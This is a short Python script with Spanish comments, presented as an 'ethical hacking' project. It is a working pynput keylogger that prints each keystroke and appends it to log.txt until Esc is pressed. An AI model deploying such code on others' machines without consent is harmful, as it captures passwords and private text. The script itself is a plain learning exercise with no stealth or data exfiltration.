'''
PROYECTOS DE HACKING ETICO WITH PYTHON
KEYLOGGER
'''
# Este proyecto implica crear un keylogger, una herramienta que registra las pulsaciones del teclado.

# Descripción: Utiliza la librería pynput para capturar las pulsaciones del teclado y registrarlas en un archivo.

from pynput import keyboard

# Función para registrar teclas presionadas
def on_press(key):
    try:
        print(f'Tecla presionada: {key.char}')
        with open("log.txt", "a") as f:
            f.write(f'Tecla presionada: {key.char}\n')
    except AttributeError:
        print(f'Tecla especial presionada: {key}')
        with open("log.txt", "a") as f:
            f.write(f'Tecla especial presionada: {key}\n')

# Función para detener el keylogger
def on_release(key):
    if key == keyboard.Key.esc:
        return False

# Iniciar el keylogger
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()